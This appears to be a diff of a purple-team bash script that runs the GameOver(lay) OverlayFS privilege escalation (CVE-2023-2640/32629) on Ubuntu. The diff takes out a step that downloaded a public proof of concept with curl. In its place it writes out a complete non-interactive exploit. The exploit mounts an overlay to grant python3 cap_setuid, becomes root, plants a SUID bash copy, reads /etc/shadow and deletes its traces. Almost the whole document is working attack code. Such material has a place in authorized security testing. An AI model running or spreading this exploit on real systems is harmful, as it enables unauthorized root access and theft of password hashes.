@@ -1,26 +1,32 @@
 #!/bin/bash
 # Purple Team A1 - Stage 1: direct LPE, no external staging (T1068 only)
+# Exploit: CVE-2023-2640/32629 (GameOver(lay)) - OverlayFS + python3 cap_setuid
 LOG=/tmp/purple_team_a1_runlog.txt
 echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_before=$(id)" >> $LOG
 
-# Download the public GameOverlay PoC
-curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh \
-  -o /tmp/.a1_s1_orig.sh 2>&1
-
-# Patch the last line: replace interactive /var/tmp/bash -p with command execution
-# Original ends with: u/bash -p -c "..."  (drops to interactive shell)
-# We inject commands to run inside the root shell instead
-sed 's|exec /var/tmp/bash -p|/var/tmp/bash -p -c "id \&\& echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED \&\& head -1 /etc/shadow" 2>\&1; rm -f /var/tmp/bash|g' \
-  /tmp/.a1_s1_orig.sh > /tmp/.a1_s1.sh 2>/dev/null || cp /tmp/.a1_s1_orig.sh /tmp/.a1_s1.sh
+# Build a self-contained exploit that runs non-interactively.
+# The g1vi PoC uses python3 os.system() to:
+#   cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf ...
+# We replace the os.system() payload so it:
+#   1. Copies bash as SUID (same technique)
+#   2. Runs commands through bash -p (non-interactive, captures output)
+#   3. Cleans up
+cat > /tmp/.a1_s1.sh << 'EXPLOIT_SCRIPT'
+#!/bin/bash
+# CVE-2023-2640 CVE-2023-32629: GameOver(lay) Ubuntu Privilege Escalation (non-interactive variant)
+echo "[+] You should be root now"
+echo "[+] Running commands in root context..."
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c '
+import os
+os.setuid(0)
+os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash")
+result = os.popen("/var/tmp/bash -p -c \"id && cat /etc/shadow | head -1 && echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED\"").read()
+print(result)
+os.system("rm -rf l m u w /var/tmp/bash")
+'
+EXPLOIT_SCRIPT
 
 chmod +x /tmp/.a1_s1.sh
 echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) running exploit" >> $LOG
 bash /tmp/.a1_s1.sh 2>&1 | tee -a $LOG
-
-# If /var/tmp/bash was left (SUID set), run commands through it
-if [ -f /var/tmp/bash ]; then
-  /var/tmp/bash -p -c "id && echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED && head -1 /etc/shadow" 2>&1 | tee -a $LOG
-  rm -f /var/tmp/bash
-fi
-
 echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_after=$(id)" >> $LOG
